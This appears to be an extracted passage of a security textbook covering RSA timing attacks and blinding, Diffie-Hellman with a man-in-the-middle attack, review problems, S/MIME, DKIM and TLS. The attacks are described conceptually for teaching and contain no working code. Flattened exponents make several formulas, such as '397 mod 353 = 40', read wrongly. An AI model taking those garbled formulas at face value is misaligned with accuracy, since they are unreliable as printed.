A timing attack is somewhat analogous to a burglar guessing the ­combination 
of a safe by observing how long it takes for someone to turn the dial from number 
to number. The attack exploits the common use of a modular exponentiation 
­algorithm in RSA encryption and decryption, but the attack can be adapted to 
work with any implementation that does not run in fixed time. In the ­modular 
­exponentiation ­algorithm, exponentiation is accomplished bit by bit, with one 
­modular ­multiplication performed at each iteration and an additional modular 
­multiplication performed for each 1 bit.
[Word Count: 94]

As Kocher points out in his paper, the attack is simplest to understand in an 
extreme case. Suppose the target system uses a modular multiplication function that 
is very fast in almost all cases but in a few cases takes much more time than an entire 
average modular exponentiation. The attack proceeds bit-by-bit ­starting with the left-
most bit, bk. Suppose that the first j bits are known (to obtain the entire ­exponent,
[Word Count: 73]

684    Chapter 21 / Public-Key Cryptography and Message Authentication
[Word Count: 9]

In practice, modular exponentiation implementations do not have such 
extreme timing variations, in which the execution time of a single iteration can 
exceed the mean execution time of the entire algorithm. Nevertheless, there is 
enough variation to make this attack practical. For details, see [KOCH96].
[Word Count: 45]

Although the timing attack is a serious threat, there are simple countermeasures 
that can be used, including the following:
[Word Count: 19]

• Constant exponentiation time: Ensure that all exponentiations take the same
[Word Count: 11]

amount of time before returning a result. This is a simple fix but does degrade 
performance.
 
• Random delay: Better performance could be achieved by adding a random delay
[Word Count: 29]

to the exponentiation algorithm to confuse the timing attack. Kocher points out 
that if defenders do not add enough noise, attackers could still succeed by col-
lecting additional measurements to compensate for the random delays.
 
• Blinding: Multiply the ciphertext by a random number before ­performing
[Word Count: 46]

­exponentiation. This process prevents the attacker from knowing what 
­ciphertext bits are being processed inside the computer and therefore ­prevents 
the bit-by-bit analysis essential to the timing attack.
[Word Count: 28]

RSA Data Security incorporates a blinding feature into some of its products. 
The private-key operation M = Cd mod n is implemented as follows:
[Word Count: 24]

1.	 Generate a secret random number r between 0 and n - 1.
	
2.	 Compute C′ = C(r e) mod n, where e is the public exponent.
	
3.	 Compute M′ =  (C′)d mod n with the ordinary RSA implementation.
	
4.	 Compute M =  M′r -1 mod n. In this equation, r -1 is the multiplicative inverse
[Word Count: 56]

of r mod n. It can be demonstrated that this is the correct result by observing 
that red mod n = r mod n.
[Word Count: 24]

RSA Data Security reports a 2 to 10% performance penalty for blinding.
[Word Count: 12]

21.4	Diffie-Hellman and Other Asymmetric
[Word Count: 5]

The first published public-key algorithm appeared in the seminal paper by Diffie 
and Hellman that defined public-key cryptography [DIFF76] and is generally 
referred to as Diffie-Hellman key exchange. A number of commercial products 
employ this key exchange technique.
[Word Count: 38]

21.4 / Diffie-Hellman and Other Asymmetric Algorithms   685
[Word Count: 8]

The purpose of the algorithm is to enable two users to exchange a secret key 
securely that can then be used for subsequent encryption of messages. The ­algorithm 
itself is limited to the exchange of the keys.
[Word Count: 37]

The Diffie-Hellman algorithm depends for its effectiveness on the difficulty of 
computing discrete logarithms. Briefly, we can define the discrete logarithm in the 
following way. First, we define a primitive root of a prime number p as one whose 
powers generate all the integers from 1 to p - 1. That is, if a is a primitive root of 
the prime number p, then the numbers
[Word Count: 66]

are distinct and consist of the integers from 1 through p - 1 in some permutation.
[Word Count: 16]

For any integer b less than p and a primitive root a of prime number p, one can 
find a unique exponent i such that
[Word Count: 25]

b = ai mod  p                    where 0 … i … (p - 1)
[Word Count: 13]

The exponent i is referred to as the discrete logarithm, or index, of b for the base a, 
mod p. We denote this value as dloga,p(b).2
[Word Count: 26]

=  (aXB mod q)XA mod q
 =  (aXB)XB mod q
  =  aXB XA mod q
[Word Count: 15]

=  (aXA)XB mod q
 =  (aXA mod q)XB mod q
 =  (YA)XB mod q
[Word Count: 14]

The result is that the two sides have exchanged a secret value. Furthermore, 
because XA and XB are private, an adversary only has the following ingredients 
to work with: q, a, YA, and YB. Thus, the adversary is forced to take a discrete 
­logarithm to determine the key. For example, to determine the private key of user 
B, an adversary must compute
[Word Count: 62]

The adversary can then calculate the key K in the same manner as user B calculates it.
[Word Count: 17]

2Many texts refer to the discrete logarithm as the index. There is no generally agreed notation for this 
concept, much less an agreed name.
[Word Count: 24]

686    Chapter 21 / Public-Key Cryptography and Message Authentication
[Word Count: 9]

The security of the Diffie-Hellman key exchange lies in the fact that, while it 
is relatively easy to calculate exponentials modulo a prime, it is very difficult to cal-
culate discrete logarithms. For large primes, the latter task is considered infeasible.
[Word Count: 41]

Here is an example. Key exchange is based on the use of the prime number 
q = 353 and a primitive root of 353, in this case a = 3. A and B select secret keys 
XA = 97 and XB = 233, respectively. Each computes its public key:
[Word Count: 49]

A computes YA = 397 mod 353 = 40.
 B computes YB = 3233 mod 353 = 248.
[Word Count: 18]

After they exchange public keys, each can compute the common secret key:
[Word Count: 12]

A computes K = (YB)XA  mod 353 = 24897 mod 353 = 160.
[Word Count: 13]

B computes K = (YA)XB  mod 353 = 40233 mod 353 = 160.
[Word Count: 13]

We assume an attacker would have available the following information:
[Word Count: 10]

In this simple example, it would be possible by brute force to deter-
mine the secret key 160. In particular, an attacker E can determine the common 
key by ­discovering a solution to the equation 3a mod 353 = 40 or the equation 
3b mod 353 = 248. The brute force approach is to calculate powers of 3 modulo 353, 
stopping when the result equals either 40 or 248. The desired answer is reached with 
the exponent value of 97, which provides 397 mod 353 = 40.
[Word Count: 87]

With larger numbers, the problem becomes impractical.
[Word Count: 7]

Generation of Secret Key by User B
K = (YA)X B mod q
[Word Count: 13]

Figure 21.7  The Diffie-Hellman Key Exchange Algorithm
[Word Count: 7]

21.4 / Diffie-Hellman and Other Asymmetric Algorithms   687
[Word Count: 8]

Alice and Bob share a
prime q and c, such that
c < q and c is a primitive
root of q
[Word Count: 22]

Alice generates a private
key XA such that XA < q
[Word Count: 11]

Alice calculates a public
key YA = cXA mod q
[Word Count: 10]

Alice receives Bob’s
public key YB in plaintext
[Word Count: 8]

Alice calculates shared
secret key K = (YB)XA mod q
[Word Count: 10]

Bob calculates shared
secret key K = (YA)XB mod q
[Word Count: 10]

Bob receives Alice’s
public key YA in plaintext
[Word Count: 8]

Bob calculates a public
key YB = cXB mod q
[Word Count: 10]

Bob generates a private
key XB such that XB < q
[Word Count: 11]

Alice and Bob share a
prime q and c, such that
c < q and c is a primitive
root of q
[Word Count: 22]

Figure 21.8  Diffie-Hellman Key Exchange
[Word Count: 5]

688    Chapter 21 / Public-Key Cryptography and Message Authentication
[Word Count: 9]

Man-in-the-Middle Attack  The protocol depicted in Figure 21.8 is insecure 
against a man-in-the-middle attack. Suppose Alice and Bob wish to exchange keys, 
and Darth is the adversary. The attack proceeds as follows:
[Word Count: 32]

1.	 Darth prepares for the attack by generating two random private keys XD1 and
[Word Count: 14]

XD2 and then computing the corresponding public keys YD1 and YD2.
	
2.	 Alice transmits YA to Bob.
	
3.	 Darth intercepts YA and transmits YD1 to Bob. Darth also calculates
[Word Count: 29]

K2 =  (YA)XD2 mod q.
	
4.	 Bob receives YD1 and calculates K1 =  (YD1)XB mod q.
	
5.	 Bob transmits YB to Alice.
	
6.	 Darth intercepts YB and transmits YD2 to Alice. Darth calculates
[Word Count: 33]

K1 =  (YB)XD1 mod q.
	
7.	 Alice receives YD2 and calculates K2 =  (YD2)XA mod q.
[Word Count: 16]

At this point, Bob and Alice think that they share a secret key, but instead 
Bob and Darth share secret key K1 and Alice and Darth share secret key K2. All 
future communication between Bob and Alice is compromised in the ­following way:
[Word Count: 43]

1.	 Alice sends an encrypted message M: E(K2, M).
	
2.	 Darth intercepts the encrypted message and decrypts it, to recover M.
	
3.	 Darth sends Bob E(K1, M) or E(K1, M=), where M= is any message. In the first
[Word Count: 38]

case, Darth simply wants to eavesdrop on the communication without altering 
it. In the second case, Darth wants to modify the ­message going to Bob.
[Word Count: 25]

The key exchange protocol is vulnerable to such an attack because it does not 
authenticate the participants. This vulnerability can be overcome with the use of 
digital signatures and public-key certificates; these topics are explored later in this 
chapter and in Chapter 2.
[Word Count: 43]

Other Public-Key Cryptography Algorithms
[Word Count: 4]

Two other public-key algorithms have found commercial acceptance: DSS and 
elliptic-curve cryptography.
[Word Count: 12]

Elliptic-Curve Cryptography  The vast majority of the products and standards 
that use public-key cryptography for encryption and digital signatures use RSA. 
The bit length for secure RSA use has increased over recent years, and this has put 
a heavier processing load on applications using RSA. This burden has ramifications, 
especially for electronic commerce sites that conduct large numbers of secure
[Word Count: 60]

21.6 / Key Terms, Review Questions, and Problems   689
[Word Count: 9]

transactions. Recently, a competing system has begun to challenge RSA: elliptic 
curve cryptography (ECC). Already, ECC is showing up in standardization efforts, 
including the IEEE P1363 Standard for Public-Key Cryptography.
[Word Count: 30]

The principal attraction of ECC compared to RSA is that it appears to offer 
equal security for a far smaller bit size, thereby reducing processing overhead. On 
the other hand, although the theory of ECC has been around for some time, it is 
only recently that products have begun to appear and that there has been sustained 
cryptanalytic interest in probing for weaknesses. Thus, the confidence level in ECC 
is not yet as high as that in RSA.
[Word Count: 78]

ECC is fundamentally more difficult to explain than either RSA or ­Diffie-Hellman, 
and a full mathematical description is beyond the scope of this book. The technique 
is based on the use of a mathematical construct known as the elliptic curve.
[Word Count: 40]

Solid treatments of hash functions and message authentication codes are found in 
[STIN06] and [MENE97].
[Word Count: 15]

The recommended treatments of encryption provided in Chapter 2 cover 
­public-key as well as symmetric encryption. [DIFF88] describes in detail the several 
attempts to devise secure two-key cryptoalgorithms and the gradual evolution of a 
variety of protocols based on them.
[Word Count: 40]

DIFF88	
Diffie, W. “The First Ten Years of Public-Key Cryptography.” Proceedings of 
the IEEE, May 1988.
MENE97	 Menezes, A.; Oorshcot, P.; and Vanstone, S. Handbook of Applied Cryptog-
[Word Count: 28]

raphy. Boca Raton, FL: CRC Press, 1997. Available free online at http://cacr
.uwaterloo.ca/hac/
STIN06	
Stinson, D. Cryptography: Theory and Practice. Boca Raton, FL: CRC Press, 
2006.
[Word Count: 26]

21.6 	Key Terms, Review Questions, and Problems
[Word Count: 7]

Diffie-Hellman key exchange
digital signature
Digital Signature Standard
[Word Count: 8]

message authentication
message authentication code
[Word Count: 5]

(MAC)
message digest
one-way hash function
private key
public key
public-key certificate
public-key encryption
[Word Count: 14]

RSA
secret key
Secure Hash Algorithm (SHA)
secure hash function
SHA-1
SHA-2
SHA-3
strong collision resistance
weak collision resistance
[Word Count: 19]

690    Chapter 21 / Public-Key Cryptography and Message Authentication
[Word Count: 9]

21.1	
In the context of a hash function, what is a compression function?
	 21.2	
What basic arithmetical and logical functions are used in SHA?
	 21.3	
What changes in HMAC are required in order to replace one underlying hash func-
tion with another?
	 21.4	
What is a one-way function?
	 21.5	
Briefly explain Diffie-Hellman key exchange.
[Word Count: 54]

21.1	
Consider a 32-bit hash function defined as the concatenation of two 16-bit functions: 
XOR and RXOR, defined in Section 21.2 as “two simple hash functions.”
a.	 Will this checksum detect all errors caused by an odd number of error bits?
[Word Count: 41]

­Explain.
b.	 Will this checksum detect all errors caused by an even number of error bits? If not,
[Word Count: 18]

characterize the error patterns that will cause the checksum to fail.
c.	 Comment on the effectiveness of this function for use as a hash function for
[Word Count: 26]

­authentication.
	21.2	
a.	 Consider the following hash function. Messages are in the form of a sequence of
[Word Count: 17]

decimal numbers, M = (a1, a2, . . .  , at). The hash value h is calculated as a a
[Word Count: 20]

mod n, for some predefined value n. Does this hash function satisfy the require-
ments for a hash function listed in Section 2.2? Explain your answer.
[Word Count: 26]

b.	 Repeat part (a) for the hash function h = a a
[Word Count: 12]

c.	 Calculate the hash function of part (b) for M = (189, 632, 900, 722, 349) and
[Word Count: 17]

and given an arbitrary block C1, choose C2 so that RSAH(C1, C2) = RSAH(B1, B2). 
Thus, the hash function does not satisfy weak collision resistance.
	 21.5	
Figure 21.9 shows an alternative means of implementing HMAC.
a.	 Describe the operation of this implementation.
b.	 What potential benefit does this implementation have over that shown in
[Word Count: 54]

Figure 21.4?
	 21.6	
Perform encryption and decryption using the RSA algorithm, as in Figure 21.6, for the 
following:
a.	 p = 3;q = 11,e = 7;M = 5
b.	 p = 5; q = 11, e = 3; M = 9
c.	 p = 7; q = 11, e = 17; M = 8
d.	 p = 11; q = 13, e = 11; M = 7
e.	 p = 17; q = 31, e = 7; M = 2
Hint: Decryption is not as hard as you think; use some finesse.
[Word Count: 92]

21.6 / Key Terms, Review Questions, and Problems   691
[Word Count: 9]

Is this scheme equivalent to RSA? Show why or why not.
[Word Count: 11]

Figure 21.9  Alternative Implementation of HMAC
[Word Count: 6]

692    Chapter 21 / Public-Key Cryptography and Message Authentication
[Word Count: 9]

21.11	
Suppose Bob uses the RSA cryptosystem with a very large modulus n for which the 
factorization cannot be found in a reasonable amount of time. Suppose Alice sends 
a message to Bob by representing each alphabetic character as an integer between 
0 and 25 (A S 0, . . . , Z S 25), and then encrypting each number separately using 
RSA with large e and large n. Is this method secure? If not, describe the most efficient 
­attack against this encryption method.
	21.12	 Consider a Diffie-Hellman scheme with a common prime q = 11 and a primitive
[Word Count: 99]

root a = 2.
a.	 If user A has public key YA = 9, what is A’s private key XA?
b.	 If user B has public key YB = 3, what is the shared secret key K?
[Word Count: 37]

Internet Security  
Protocols and Standards
[Word Count: 5]

Internet Mail Architecture
DKIM Strategy
[Word Count: 5]

22.3	
Secure Sockets Layer (SSL) and Transport Layer Security (TLS)
[Word Count: 10]

TLS Architecture
TLS Protocols
TLS Attacks
SSL/TLS Attacks
[Word Count: 8]

Connection Initiation
Connection Closure
[Word Count: 4]

IP Security Overview
The Scope of IPsec
Security Associations
Encapsulating Security Payload
Transport and Tunnel Modes
[Word Count: 16]

22.7	
Key Terms, Review Questions, and Problems
[Word Count: 7]

694    Chapter 22 / Internet Security Protocols and Standards
[Word Count: 9]

This chapter looks at some of the most widely used and important Internet security 
protocols and standards.
[Word Count: 17]

S/MIME (Secure/Multipurpose Internet Mail Extension) is a security enhancement 
to the MIME Internet e-mail format standard, based on technology from RSA Data 
Security.
[Word Count: 23]

MIME is an extension to the old RFC 822 specification of an Internet mail format. 
RFC 822 defines a simple header with To, From, Subject, and other fields that can 
be used to route an e-mail message through the Internet and that provides basic 
information about the e-mail content. RFC 822 assumes a simple ASCII text format 
for the content.
[Word Count: 60]

MIME provides a number of new header fields that define information about 
the body of the message, including the format of the body and any encoding that 
is done to facilitate transfer. Most important, MIME defines a number of content 
formats, which standardize representations for the support of multimedia e-mail. 
Examples include text, image, audio, and video.
[Word Count: 57]

S/MIME is defined as a set of additional MIME content types (Table 22.1) and 
­provides the ability to sign and/or encrypt e-mail messages. In essence, these 
­content-types support four new functions:
[Word Count: 31]

• Enveloped data: This function consists of encrypted content of any type and
[Word Count: 13]

encrypted-content encryption keys for one or more recipients.
 
• Signed data: A digital signature is formed by taking the message digest of the
[Word Count: 23]

content to be signed and then encrypting that with the private key of the signer. 
The content plus signature are then encoded using base64 encoding. A signed 
data message can only be viewed by a recipient with S/MIME capability.
[Word Count: 39]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Provide an overview of MIME.
◆	Understand the functionality of S/MIME and the security threats it addresses.
◆	Explain the key components of SSL.
◆	Discuss the use of HTTPS.
◆	Provide an overview of IPsec.
◆	Discuss the format and functionality of the Encapsulating Security Payload.
[Word Count: 48]

Type
	
Subtype
	S/MIME Parameter
	
Description
[Word Count: 5]

Multipart
Signed
A clear-signed message in two parts: one is 
the message and the other is the signature.
[Word Count: 18]

Application
pkcs7-mime
signedData
A signed S/MIME entity.
[Word Count: 7]

pkcs7-mime
envelopedData
An encrypted S/MIME entity.
[Word Count: 6]

pkcs7-mime
degenerate signedData
An entity containing only public-key 
­certificates.
[Word Count: 9]

pkcs7-mime
CompressedData
A compressed S/MIME entity.
[Word Count: 6]

pkcs7-signature
signedData
The content type of the signature subpart  
of a multipart/signed message.
[Word Count: 13]

• Clear-signed data: As with signed data, a digital signature of the content is
[Word Count: 14]

formed. However, in this case, only the digital signature is encoded using 
base64. As a result, recipients without S/MIME capability can view the 
­message content, although they cannot verify the signature.
 
• Signed and enveloped data: Signed-only and encrypted-only entities may be
[Word Count: 42]

nested, so that encrypted data may be signed and signed data or clear-signed 
data may be encrypted.
[Word Count: 17]

Figure 22.1 provides a typical example of the use of S/MIME.
[Word Count: 11]

DhYz949avHVA
t5UpjUXn8L79o
ADnluV3vpuhE
HMEcMBB1K9
Y8ZoJOYAmF2
BsIpLbjDkNJQ
Rj98Ik1SSmju65
0SoD1FkYYtTq
wpo9812KK1mH
xcFGIU8700qQr
RsdfgIUYTp0m
8H7G4FF32jko
NNNmj78uqwpl
HYTG0098UhYt
[Word Count: 14]

This is an
S/MIME
message from
Bob to Alice.
Bob will sign
and encrypt the
message before
sending it to
Alice. And so on
[Word Count: 24]

This is an
S/MIME
message from
Bob to Alice.
Bob will sign
and encrypt the
message before
sending it to
Alice. And so on
[Word Count: 24]

Figure 22.1  Typical S/MIME Process for Creating and S/MIME Message
[Word Count: 10]

696    Chapter 22 / Internet Security Protocols and Standards
[Word Count: 9]

As an alternative, the RSA public-key encryption algorithm can be used with 
either the SHA-1 or the MD5 message digest algorithm for forming signatures.
[Word Count: 24]

The signature is a binary string, and sending it in that form through the 
Internet e-mail system could result in unintended alteration of the contents, 
because some e-mail software will attempt to interpret the message content look-
ing for control characters such as line feeds. To protect the data, either the sig-
nature alone or the signature plus the message are mapped into printable ASCII 
characters using a scheme known as radix-64 or base64 mapping. Radix-64 maps 
each input group of three octets of binary data into four ASCII characters (see 
Appendix G).
[Word Count: 93]

If encryption is used alone, radix-64 is used to convert the ciphertext to ASCII 
format.
[Word Count: 15]

Public-Key Certificates  As can be seen from the discussion so far, S/MIME 
contains a clever, efficient, interlocking set of functions and formats to provide an 
effective encryption and signature service. To complete the system, one final area 
needs to be addressed, that of public-key management.
[Word Count: 45]

The basic tool that permits widespread use of S/MIME is the public-key certif-
icate. S/MIME uses certificates that conform to the international standard X.509v3.
[Word Count: 24]

To understand the operation of DKIM, it is useful to have a basic grasp of the 
Internet mail architecture, which is currently defined in RFC 5598. This subsection 
provides an overview of the basic concepts.
[Word Count: 35]

Figure 22.2 illustrates the key components of the Internet mail architecture, 
which include the following:
[Word Count: 15]

• Message User Agent (MUA): Works on behalf of user actors and user
[Word Count: 13]

applications. It is their representative within the e-mail service. Typically, this 
function is housed in the user’s computer and is referred to as a client e-mail 
program or a local network e-mail server. The author MUA formats a mes-
sage and performs initial submission into the MHS via a MSA. The recipient 
MUA processes received mail for storage and/or display to the recipient user.
 
• Mail submission agent (MSA): Accepts the message submitted by an MUA
[Word Count: 76]

and enforces the policies of the hosting domain and the requirements of 
Internet standards. This function may be located together with the MUA or 
as a separate functional model. In the latter case, the Simple Mail Transfer 
Protocol (SMTP) is used between the MUA and the MSA.
[Word Count: 47]

• Message transfer agent (MTA): Relays mail for one application-level hop. It is
[Word Count: 13]

like a packet switch or IP router in that its job is to make routing assessments 
and to move the message closer to the recipients. Relaying is performed by a 
sequence of MTAs until the message reaches a destination MDA. An MTA
[Word Count: 42]

698    Chapter 22 / Internet Security Protocols and Standards
[Word Count: 9]

also adds trace information to the message header. SMTP is used between 
MTAs and between an MTA and an MSA or MDA.
 
• Mail delivery agent (MDA): Responsible for transferring the message from
[Word Count: 33]

the MHS to the MS.
 
• Message store (MS): An MUA can employ a long-term MS. An MS can be
[Word Count: 20]

located on a remote server or on the same machine as the MUA. Typically, 
an MUA retrieves messages from a remote server using POP (Post Office 
Protocol) or IMAP (Internet Message Access Protocol).
[Word Count: 33]

Two other concepts need to be defined. An administrative management 
domain (ADMD) is an Internet e-mail provider. Examples include a depart-
ment that operates a local mail relay (MTA), an IT department that operates 
an enterprise mail relay, and an ISP that operates a public shared e-mail serv-
ice. Each ADMD can have different operating policies and trust-based decision 
making. One obvious example is the distinction between mail that is exchanged 
within an organization and mail that is exchanged between independent organi-
zations. The rules for handling the two types of traffic tend to be quite different.
[Word Count: 97]

The Domain name system (DNS) is a directory lookup service that provides 
a mapping between the name of a host on the Internet and its numerical address.
[Word Count: 27]

DKIM is designed to provide an e-mail authentication technique that is transparent 
to the end user. In essence, a user’s e-mail message is signed by a private key of the 
administrative domain from which the e-mail originates. The signature ­covers all 
of the content of the message and some of the RFC 5322 message ­headers. At the
[Word Count: 57]

Figure 22.2  Function Modules and Standardized Protocols Used Between Them
[Word Count: 10]

receiving end, the MDA can access the corresponding public key via a DNS and 
verify the signature, thus authenticating that the message comes from the claimed 
administrative domain. Thus, mail that originates from somewhere else but claims 
to come from a given domain will not pass the authentication test and can be 
rejected. This approach differs from that of S/MIME, which uses the originator’s 
private key to sign the content of the message. The motivation for DKIM is based 
on the ­following reasoning:
[Word Count: 83]

1.	 S/MIME depends on both the sending and receiving users employing S/MIME.
[Word Count: 12]

For almost all users, the bulk of incoming mail does not use S/MIME, and the 
bulk of the mail the user wants to send is to recipients not using S/MIME.
	
2.	 S/MIME signs only the message content. Thus, RFC 5322 header information
[Word Count: 42]

concerning origin can be compromised.
	
3.	 DKIM is not implemented in client programs (MUAs) and is therefore
[Word Count: 17]

­transparent to the user; the user need take no action.
	
4.	 DKIM applies to all mail from cooperating domains.
	
5.	 DKIM allows good senders to prove that they did send a particular message
[Word Count: 33]

and to prevent forgers from masquerading as good senders.
[Word Count: 9]

Figure 22.3 is a simple example of the operation of DKIM. We begin with 
a message generated by a user and transmitted into the MHS to an MSA that is
[Word Count: 30]

DNS  = domain name system
MDA = mail delivery agent
MSA  = mail submission agent
MTA  = message transfer agent
MUA = message user agent
[Word Count: 25]

Figure 22.3  Simple Example of DKIM Deployment
[Word Count: 7]

700    Chapter 22 / Internet Security Protocols and Standards
[Word Count: 9]

22.3	Secure Sockets Layer (SSL) and Transport
[Word Count: 7]

TLS is designed to make use of TCP to provide a reliable end-to-end secure ­service. 
TLS is not a single protocol but rather two layers of protocols, as illustrated in 
Figure 22.4.
[Word Count: 32]

The Record Protocol provides basic security services to various higher-layer 
protocols. In particular, the Hypertext Transfer Protocol (HTTP), which provides 
the transfer service for Web client/server interaction, can operate on top of TLS.
[Word Count: 33]

22.3 / Secure Sockets Layer (SSL) and Transport Layer Security (TLS)   701
[Word Count: 12]

Three higher-layer protocols are defined as part of TLS: the Handshake Protocol, 
the Change Cipher Spec Protocol, and the Alert Protocol. These TLS-specific pro-
tocols are used in the management of TLS exchanges and are examined later in this 
section.
[Word Count: 40]

Two important TLS concepts are the TLS session and the TLS connection, 
which are defined in the specification as follows:
[Word Count: 20]

• Connection: A connection is a transport (in the OSI layering model ­definition)
[Word Count: 13]

that provides a suitable type of service. For TLS, such connections are peer-­ 
to-peer relationships. The connections are transient. Every connection is 
­associated with one session.
 
• Session: A TLS session is an association between a client and a server. Sessions
[Word Count: 41]

are created by the Handshake Protocol. Sessions define a set of ­cryptographic 
security parameters, which can be shared among multiple ­connections. 
Sessions are used to avoid the expensive negotiation of new ­security param-
eters for each connection.
[Word Count: 37]

Between any pair of parties (applications such as HTTP on client and 
server), there may be multiple secure connections. In theory, there may also be 
multiple simultaneous sessions between parties, but this feature is not used in 
practice.
[Word Count: 38]

Record Protocol  The SSL Record Protocol provides two services for SSL 
connections:
[Word Count: 12]

• Confidentiality: The Handshake Protocol defines a shared secret key that is
[Word Count: 12]

used for symmetric encryption of SSL payloads.
 
• Message integrity: The Handshake Protocol also defines a shared secret key
[Word Count: 19]

that is used to form a message authentication code (MAC).
[Word Count: 10]

Figure 22.5 indicates the overall operation of the SSL Record Protocol. The 
first step is fragmentation. Each upper-layer message is fragmented into blocks of 
214 bytes (16,384 bytes) or less. Next, compression is optionally applied. The next 
step in processing is to compute a message authentication code over the compressed 
data. Next, the compressed message plus the MAC are encrypted using symmetric 
encryption.
[Word Count: 63]

The final step of SSL Record Protocol processing is to prepend a header, 
­which includes version and length fields.
[Word Count: 19]

The content types that have been defined are change_cipher_spec, alert, 
handshake, and application_data. The first three are the TLS-specific protocols, 
discussed next. Note that no distinction is made among the various applications 
(e.g., HTTP) that might use TLS; the content of the data created by such applica-
tions is opaque to TLS.
[Word Count: 52]

The Record Protocol then transmits the resulting unit in a TCP segment. 
Received data are decrypted, verified, decompressed, and reassembled, and then 
delivered to higher-level users.
[Word Count: 26]

702    Chapter 22 / Internet Security Protocols and Standards
[Word Count: 9]

Change Cipher Spec Protocol  The Change Cipher Spec Protocol is one of 
the four TLS-specific protocols that use the TLS Record Protocol, and it is the 
simplest. This protocol consists of a single message, which consists of a single byte 
with the value 1. The sole purpose of this message is to cause the pending state to 
be copied into the current state, which updates the cipher suite to be used on this 
connection.
[Word Count: 74]

Alert Protocol  The Alert Protocol is used to convey TLS-related alerts to the 
peer entity. As with other applications that use TLS, alert messages are compressed 
and encrypted, as specified by the current state.
[Word Count: 34]

Each message in this protocol consists of two bytes. The first byte takes the 
value warning(1) or fatal(2) to convey the severity of the message. If the level is 
fatal, TLS immediately terminates the connection. Other connections on the same 
­session may continue, but no new connections on this session may be established. 
The second byte contains a code that indicates the specific alert. An example of 
a fatal alert is an incorrect MAC. An example of a nonfatal alert is a close_notify 
­message, which notifies the recipient that the sender will not send any more 
­messages on this connection.
[Word Count: 100]

Handshake Protocol  The most complex part of TLS is the Handshake 
Protocol. This protocol allows the server and client to authenticate each other 
and to negotiate an encryption and MAC algorithm and cryptographic keys to 
be used to protect data sent in an TLS record. The Handshake Protocol is used 
before any application data are transmitted.
[Word Count: 56]

The Handshake Protocol consists of a series of messages exchanged by ­client 
and server. Figure 22.6 shows the initial exchange needed to establish a ­logical 
connection between client and server. The exchange can be viewed as ­having  
four phases.
[Word Count: 39]

Figure 22.5  TLS Record Protocol Operation
[Word Count: 6]

22.3 / Secure Sockets Layer (SSL) and Transport Layer Security (TLS)   703
[Word Count: 12]

Phase 1 is used to initiate a logical connection and to establish the security 
capabilities that will be associated with it. The exchange is initiated by the client, 
which sends a client_hello message with the following parameters:
[Word Count: 37]

• Version: The highest TLS version understood by the client.
 
• Random: A client-generated random structure, consisting of a 32-bit times-
[Word Count: 21]

tamp and 28 bytes generated by a secure random number generator. These 
values are used during key exchange to prevent replay attacks.
[Word Count: 22]

Phase 1
Establish security capabilities, including
protocol version, session ID, cipher suite,
compression method, and initial random
numbers.
[Word Count: 18]

Phase 2
Server may send certiﬁcate, key exchange,
and request certiﬁcate. Server signals end
of hello message phase.
[Word Count: 18]

Phase 3
Client sends certiﬁcate if requested. Client
sends key exchange. Client may send
certiﬁcate veriﬁcation.
[Word Count: 16]

Phase 4
Change cipher suite and ﬁnish
handshake protocol.
[Word Count: 9]

Note: Shaded transfers are
optional or situation-dependent
messages that are not always sent.
[Word Count: 13]

704    Chapter 22 / Internet Security Protocols and Standards
[Word Count: 9]

• Session ID: A variable-length session identifier. A nonzero value indicates
[Word Count: 11]

that the client wishes to update the parameters of an existing connection or 
create a new connection on this session. A zero value indicates that the client 
wishes to establish a new connection on a new session.
 
• CipherSuite: This is a list that contains the combinations of cryptographic
[Word Count: 49]

algorithms supported by the client, in decreasing order of preference. Each 
element of the list (each cipher suite) defines both a key exchange algorithm 
and a CipherSpec.
 
• Compression method: This is a list of the compression methods the client
[Word Count: 40]

After sending the client_hello message, the client waits for the server_hello 
message, which contains the same parameters as the client_hello message.
[Word Count: 21]

The details of phase 2 depend on the underlying public-key encryption scheme 
that is used. In some cases, the server passes a certificate to the client, possibly addi-
tional key information, and a request for a certificate from the client.
[Word Count: 40]

The final message in phase 2, and one that is always required, is the server_done 
message, which is sent by the server to indicate the end of the server hello and associ-
ated messages. After sending this message, the server will wait for a client response.
[Word Count: 46]

In phase 3, upon receipt of the server_done message, the client should verify 
that the server provided a valid certificate if required and check that the server_
hello parameters are acceptable. If all is satisfactory, the client sends one or more 
messages back to the server, depending on the underlying public-key scheme.
[Word Count: 52]

Phase 4 completes the setting up of a secure connection. The client sends a 
change_cipher_spec message and copies the pending CipherSpec into the current 
CipherSpec. Note that this message is not considered part of the Handshake Protocol 
but is sent using the Change Cipher Spec Protocol. The client then immediately 
sends the finished message under the new algorithms, keys, and secrets. The finished 
message verifies that the key exchange and authentication processes were successful.
[Word Count: 74]

In response to these two messages, the server sends its own change_cipher_spec 
message, transfers the pending to the current CipherSpec, and sends its finished 
message. At this point, the handshake is complete and the client and server may 
begin to exchange application layer data.
[Word Count: 44]

Heartbeat Protocol  In the context of computer networks, a heartbeat is a 
periodic signal generated by hardware or software to indicate normal operation 
or to synchronize other parts of a system. A Heartbeat Protocol is typically used 
to monitor the availability of a protocol entity. In the specific case of SSL/TLS, 
a Heartbeat protocol was defined in 2012 in RFC 6250 (Transport Layer Security 
(TLS) and Datagram Transport Layer Security (DTLS) Heartbeat Extension).
[Word Count: 73]

The Heartbeat Protocol runs on the top of the TLS Record Protocol and con-
sists of two message types: heartbeat_request and heartbeat_response. The use of 
the Heartbeat Protocol is established during Phase 1 of the Handshake Protocol 
(Figure 22.6). Each peer indicates whether it supports heartbeats. If heartbeats 
are supported, the peer indicates whether it is willing to receive heartbeat_request  
messages and respond with heartbeat_response messages or only willing to send 
heartbeat_request messages.
[Word Count: 73]

22.3 / Secure Sockets Layer (SSL) and Transport Layer Security (TLS)   705
[Word Count: 12]

The heartbeat serves two purposes. First, it assures the sender that the recipi-
ent is still alive, even though there may not have been any activity over the under-
lying TCP connection for a while. Second, the heartbeat generates activity across 
the connection during idle periods, which avoids closure by a firewall that does not 
tolerate idle connections.
[Word Count: 58]

The requirement for the exchange of a payload was designed into the 
Heartbeat Protocol to support its use in a connectionless version of TLS known as 
DTLS. Because a connectionless service is subject to packet loss, the payload ena-
bles the requestor to match response messages to request messages. For simplicity, 
the same version of the Heartbeat Protocol is used with both TLS and DTLS. Thus, 
the payload is required for both TLS and DTLS.
[Word Count: 75]

Since the first introduction of SSL in 1994, and the subsequent standardization of 
TLS, numerous attacks have been devised against these protocols. The appearance 
of each attack has necessitated changes in the protocol, the encryption tools used, or 
some aspects of the implementation of SSL and TLS to counter these threats.
[Word Count: 51]

